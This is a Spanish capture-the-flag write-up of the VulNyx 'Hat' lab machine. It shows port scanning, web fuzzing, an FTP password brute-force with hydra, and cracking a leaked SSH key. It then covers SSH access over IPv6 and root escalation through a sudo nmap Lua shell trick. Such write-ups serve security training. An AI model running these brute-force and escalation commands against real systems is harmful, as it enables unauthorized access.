---
layout      : post
title       : "Hat - Vulnyx"
author      : elc4br4
image       : /assets/images/VULNYX/Hat-Vulnyx/Hat.jpg
optimized_image : /assets/images/VULNYX/Hat-Vulnyx/Hat.jpg
category    : [ Vulnyx ]
tags        : [ Linux ]
description : En esta ocasión resolveremos una máquina Medium de la nueva plataforma Vulnyx, en la que tocaremos un poco de fuerza bruta, ipv6 y escalaremos usando el binario nmap.
---

🎩Estamos ante una máquina Linux Medium de la nueva plataforma VulNyx en la que tenemos máquinas basadas en UNIX con diferentes niveles de dificultad para aprender y practicar las habilidades de Ciberseguridad🎩.

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como siempre comenzamos buscando puertos abiertos en la máquina víctima.

Y esto lo hacemos con la herramienta nmap.

```r
PORT      STATE    SERVICE
22/tcp    filtered ssh
80/tcp    open     http
65535/tcp open     unknown
```

Encontramos estos 3 puertos, dos abiertos y el 22 filtered (que no cerrado).

Para obtener algo más de información acerca de estos puertos lanzo un escaneo un poco más avanzado, en el cuál se lanzan scripts básicos de reconocimiento y enumeración de nmap.

```r
PORT      STATE    SERVICE VERSION
22/tcp    filtered ssh
80/tcp    open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
65535/tcp open     ftp     pyftpdlib 1.5.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.0.34:65535
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
```

Ahora ya vemos algo más...

En el puerto 65535 tenemos un servidor ftp y en el puerto 80 un simple servidor web Apache 2.4.38.

El servidor fto no parece tener acceso anónimo por lo que comenzaré enumerando el servidor web Apache.

Accedo desde el navegador y encuentro la típica página de apache.

![](/assets/images/VULNYX/Hat-Vulnyx/web1.webp)

Por lo que el siguiente paso es fuzzear en busca de rutas o archivos existentes en el servidor.

Lo haré con la herramienta wfuzz.

```r
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.34/FUZZ
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000002271:   301        9 L      28 W       311 Ch      "logs"                                                                                                                 
000038759:   301        9 L      28 W       318 Ch      "php-scripts"                                                                                                          
000095524:   403        9 L      28 W       277 Ch      "server-status"  
```

![](/assets/images/VULNYX/Hat-Vulnyx/fuzz1.webp)

Tenemos dos directorios `logs` y `php-scripts` por lo que continuaré fuzzeando en cada uno de ellos para descubrir archivos que puedan servirme.

Primero comenzaré fuzzeando archivos .log dentro de la ruta `/logs`.

```r
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.34/logs/FUZZ.log
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000039214:   200        25 L     190 W      1760 Ch     "vsftpd" 
```

Encontramos el archivo `vsftpd.log`, me lo descargo y le hago un cat para ver que contiene.

```bash
[I 2021-09-28 18:43:57] >>> starting FTP server on 0.0.0.0:21, pid=475 <<<
[I 2021-09-28 18:43:57] concurrency model: async
[I 2021-09-28 18:43:57] masquerade (NAT) address: None
[I 2021-09-28 18:43:57] passive ports: None
[I 2021-09-28 18:44:02] 192.168.1.83:49268-[] FTP session opened (connect)
[I 2021-09-28 18:44:06] 192.168.1.83:49280-[] USER 'l4nr3n' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49290-[] USER 'softyhack' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49292-[] USER 'h4ckb1tu5' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49272-[] USER 'noname' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49278-[] USER 'cromiphi' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49284-[] USER 'b4el7d' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49270-[] USER 'shelldredd' failed login.
[I 2021-09-28 18:44:06] 192.168.1.83:49270-[] USER 'anonymous' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49292-[] USER 'alienum' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49280-[] USER 'k1m3r4' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49284-[] USER 'tatayoyo' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49278-[] USER 'Exploiter' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49268-[] USER 'tasiyanci' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49274-[] USER 'luken' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49270-[] USER 'ch4rm' failed login.
[I 2021-09-28 18:44:09] 192.168.1.83:49282-[] FTP session closed (disconnect).
[I 2021-09-28 18:44:09] 192.168.1.83:49280-[admin_ftp] USER 'admin_ftp' logged in.
[I 2021-09-28 18:44:09] 192.168.1.83:49280-[admin_ftp] FTP session closed (disconnect).
[I 2021-09-28 18:44:12] 192.168.1.83:49272-[] FTP session closed (disconnect).
```

Si nos fijamos, es un archivo de registro donde podemos ver que se ha intentado acceder al servicio ftp con diferentes usuarios, todos fallidos excepto con el usuario `admin_ftp`

Por lo que sabiendo el usuario podríamos probar a hacer un ataque de fuerza bruta al servicio ssh con hydra usando el usuario `admin_ftp`.

# Explotación [#](explotación) {#explotación}

El comando usado para el ataque de fuerza bruta es el siguiente:

```bash
hydra -t 50 -l admin_ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.34 -s 65535
```

Lanzamos el ataque y tras un minuto aproximadamente obtenemos la contraseña.

```bash
[DATA] attacking ftp://192.168.0.34:65535/
[STATUS] 900.00 tries/min, 900 tries in 00:01h, 14343499 to do in 265:38h, 50 active
[65535][ftp] host: 192.168.0.34   login: admin_ftp   password: cowboy
```

> admin_ftp:cowboy

Ahora que ya disponemos de la contraseña, el siguiente paso es conectarnos al servicio ftp para ver que nos encontramos.

```bash
❯ ftp 192.168.0.34  65535
Connected to 192.168.0.34.
220 pyftpdlib 1.5.4 ready.
Name (192.168.0.34:elc4br4): admin_ftp
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> cd share
250 "/share" is the current directory.

ftp> ls -la
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 cromiphi cromiphi     1751 Sep 28  2021 id_rsa
-rwxrwxrwx   1 cromiphi cromiphi      108 Sep 28  2021 note
226 Transfer complete.

ftp> get note
local: note remote: note
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
108 bytes received in 0.00 secs (219.7266 kB/s)

ftp> get id_rsa
local: id_rsa remote: id_rsa
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
1751 bytes received in 0.00 secs (2.7153 MB/s)
```

Encuentro dos archivos dentro, una nota y una clave privada rsa y también podemos ver que existe el usuario cromiphi.

En la nota encontramos el siguiente mensaje.

```bash
Hi,

We have successfully secured some of our most critical protocols ... no more worrying!


Sysadmin
```

Pero lo que realmente me interesa es la clave privada, ya que podría obtener la pass y conectarme vía ssh.

Por lo que haciendo uso de la herramienta RSAcrack de d4t4s3c intento craquear la clave rsa.

![](/assets/images/VULNYX/Hat-Vulnyx/RSAcrack.webp)

Y como vemos hemos podido craquear la clave.

Ahora uso la clave y la pass de la misma para conectarme vía ssh, pero existe un problema... El puerto 22 está filtered!!!!

Como ya vimos en la máquina Responder, el puerto 22 puede estar filtered vía ipv4 pero no vía ipv6, por lo que lo primero es obtener la dirección ipv6 de la máquina víctima.

Con el comando ping6 podemos obtener la dirección ipv6 de la máquina, en mi caso la dirección ipv6 es la siguiente.

`fe80::a00:27ff:fe7b:83a2`

Por lo que me conecto vía ssh usando la ipv6 y la clave rsa.

```bash
❯ ssh -6 -i id_rsa cromiphi@fe80::a00:27ff:fe7b:83a2%enp0s3
The authenticity of host 'fe80::a00:27ff:fe7b:83a2%enp0s3 (fe80::a00:27ff:fe7b:83a2%enp0s3)' can't be established.
ECDSA key fingerprint is SHA256:FVPw1/oC2m9PbWXT/7H0/iIBjVYsimczYCKqVmrwjBw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'fe80::a00:27ff:fe7b:83a2%enp0s3' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux Hat 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
cromiphi@Hat:~$ id
uid=1000(cromiphi) gid=1000(cromiphi) grupos=1000(cromiphi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

Y por fin estoy dentro de la máquina como el usuario cromiphi.

Llegados a este paso ya podemos leer la flag de usuario.

Y ya para finalizar solo nos quedaría escalar privilegios y convertirnos en el usuario root.

# Escalada de Privilegios [#](Escalada de Privilegios) {#privesc}

Para ello lo primero que hago es enumerar permisos de sudo con el comando `sudo -l`

```bash
cromiphi@Hat:~$ sudo -l
Matching Defaults entries for cromiphi on Hat:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cromiphi may run the following commands on Hat:
    (root) NOPASSWD: /usr/bin/nmap
```

Podemos ejecutar el binario nmap como root sin contraseña, por lo que ahí está la manera de escalar privilegios.

Y como de costumbre nos dirigimos a la web de gtfobins y vemos como podemos abusar del binario nmap para escalar privilegios.

![](/assets/images/VULNYX/Hat-Vulnyx/nmap-root.webp)

```bash
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

![](/assets/images/VULNYX/Hat-Vulnyx/root.webp)

Y ya somos root y hemos pwneado la máquina!

![](/assets/images/VULNYX/Hat-Vulnyx/gif.gif)